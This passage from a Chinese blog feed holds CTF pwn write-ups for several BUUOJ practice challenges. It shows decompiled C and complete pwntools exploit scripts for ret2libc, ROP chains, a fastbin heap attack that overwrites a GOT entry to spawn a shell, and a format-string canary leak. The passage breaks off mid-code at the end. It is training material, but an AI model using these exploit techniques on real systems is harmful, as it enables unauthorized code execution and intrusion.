class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HaHaHa!\nWhat else can you do???&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里close了标准输出和标准错误，也就是说，虽然有了shell，但是获得不了输出。</p><p>可以通过<code>exec 1&gt;&amp;0</code>来把标准输出重定向到文件描述符0（标准输入），这个文件默认是开启的。这样我们就可以看到输出了。</p><blockquote><p>  exec有两个作用</p><ol><li> 代替shell执行命令，区别是shell执行完之后会回到shell，而exec会直接退出。</li><li> 文件重定向，也就是<code>exec 1&gt;&amp;0</code>这样将文件描述符为1的文件重定向到0上</li></ol></blockquote><p>所以，，nc然后exec就OK</p><h1 id="0x3E"><a href="#0x3E" class="headerlink" title="0x3E."></a>0x3E.</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x30-jarvisoj-level1&quot;&gt;&lt;a href=&quot;#0x30-jarvisoj-level1&quot; class=&quot;headerlink&quot; title=&quot;0x30.jarvisoj_level1&quot;&gt;&lt;/a&gt;0x30.jarvisoj</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWN刷题_0x21-0x2F</title>
    <link href="http://example.com/2021/07/11/BUU-PWN-0x20-0x2F/"/>
    <id>http://example.com/2021/07/11/BUU-PWN-0x20-0x2F/</id>
    <published>2021-07-10T16:00:00.000Z</published>
    <updated>2021-07-20T12:46:13.586Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="0x20-jarvisoj-level3-x64"><a href="#0x20-jarvisoj-level3-x64" class="headerlink" title="0x20.jarvisoj_level3_x64"></a>0x20.jarvisoj_level3_x64</h2><p>ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3_x64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29779</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+ p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) +p64(read_got)+p64(<span class="number">8</span>)+p64(write_plt)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_add = u64(io.recv()[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_add)</span><br><span class="line">base = read_add - libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">sys_add = base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_add)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x21-picoctf-2018-rop-chain"><a href="#0x21-picoctf-2018-rop-chain" class="headerlink" title="0x21.picoctf_2018_rop chain"></a>0x21.picoctf_2018_rop chain</h2><p>win1():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win_function1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  win1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>win2():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">win_function2</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)win1;</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; a1 == <span class="number">0xBAAAAAAD</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    win2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( win1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong Argument. Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Nope. Try a little bit harder.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">48</span>]; <span class="comment">// [esp+Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">0xDEADBAAD</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( win1 || win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./PicoCTF_2018_rop_chain&quot;</span>)</span><br><span class="line">win1 = <span class="number">0x80485CB</span></span><br><span class="line">win2 = <span class="number">0x80485D8</span></span><br><span class="line">flag = <span class="number">0x804862B</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(win1) + p32(win2)+ p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) +p32(<span class="number">0xDEADBAAD</span>) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x22-ZJCTF-2019-EasyHeap"><a href="#0x22-ZJCTF-2019-EasyHeap" class="headerlink" title="0x22.[ZJCTF 2019]EasyHeap"></a>0x22.[ZJCTF 2019]EasyHeap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>creat没有什么问题，但是edit有问题，可以重新写任意长度。</p><p>delete在free后相应的heaparray就置位0。</p><p>大致思路是这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)<span class="comment">#idx0</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x10</span>)<span class="comment">#idx1</span></span><br><span class="line">create(<span class="number">0x80</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)<span class="comment">#idx2  防止与top chunk合并</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">io.interactive(<span class="built_in">str</span>(<span class="number">4869</span>))</span><br></pre></td></tr></table></figure><p>但是很可惜，buu他没有/home/pwn/flag这个文件，所以得用其他的方法了。</p><p>另一个思路：</p><ul><li>  首先create 3个chunk</li><li>  使用house of sprite 技术，伪造chunk到heaparray附近，找一个地址开头为7f的来伪造相应大小的fastbin</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32xw 0x6020a0 -3</span><br><span class="line">0x60209d:0x200000000x05212e060x0000007f0x00000000</span><br><span class="line">0x6020ad:0xe00000000x05212df80x0000007f0x00000000</span><br><span class="line">0x6020bd:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x6020cd:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x6020dd:0x100000000x0000db500x300000000x0000db50</span><br><span class="line">0x6020ed &lt;heaparray+13&gt;:0x500000000x0000db500x700000000x0000db50</span><br><span class="line">0x6020fd &lt;heaparray+29&gt;:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x60210d &lt;heaparray+45&gt;:0x000000000x000000000x000000000x00000000</span><br></pre></td></tr></table></figure><ul><li>  在chunk1写入/bin/sh，free掉chunk2</li><li>  edit chunk1，并修改chunk2的fd为0x6020b0 -3</li><li>  之后malloc两次，并修改heaparray为free_got.</li><li>  继续ecit0，将free_got改为system</li><li>  再之后delete chunk1就能拿到shell</li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./easyheap&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26600</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_heap</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_heap</span>(<span class="params">index,size,payload</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_heap</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">heaparray = <span class="number">0x6020b0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">creat_heap(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&quot;a&quot;</span>*<span class="number">10</span>)<span class="comment">#idx0</span></span><br><span class="line">creat_heap(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&quot;b&quot;</span>*<span class="number">10</span>)<span class="comment">#idx1</span></span><br><span class="line">creat_heap(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">&quot;c&quot;</span>*<span class="number">10</span>)<span class="comment">#idx2</span></span><br><span class="line">delete_heap(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> + p64(<span class="number">0</span>)*<span class="number">12</span> + p64(<span class="number">0x71</span>) +p64(heaparray - <span class="number">3</span>)</span><br><span class="line">edit_heap(<span class="number">1</span>,size(payload),payload)</span><br><span class="line">payload = <span class="string">&quot;\xaa&quot;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">4</span> + p64(free_got)</span><br><span class="line">creat_heap(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&quot;aaa&quot;</span>)<span class="comment">#idx2</span></span><br><span class="line">creat_heap(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#fake_chunk</span></span><br><span class="line">edit_heap(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="built_in">len</span>(p64(sys)),p64(sys))</span><br><span class="line">delete_heap(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x23-bjdctf-2020-babyrop2"><a href="#0x23-bjdctf-2020-babyrop2" class="headerlink" title="0x23.bjdctf_2020_babyrop2"></a>0x23.bjdctf_2020_babyrop2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec bjdctf_2020_babyrop2 </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/bjdctf_2020_babyrop2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>开了对战不可执行和canary。</p><p>主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init();</span><br><span class="line">  gift(argc, argv);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can u return to libc ?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try u best!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">gift</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gift()中有格式化字符串，限制了长度，但是可以泄露canary值。</p><p>通过调试可以知道canary在格式化字符串的后面</p><p>格式化字符串偏移是6：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line">fmt_str = <span class="number">0x0400A01</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400993</span></span><br><span class="line">io.recv()</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload = <span class="string">&quot;aa%6$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>所以canary是7.</p><p>接下来就是简单的栈溢出了。</p><figure class="highlight python"><table><tr><td 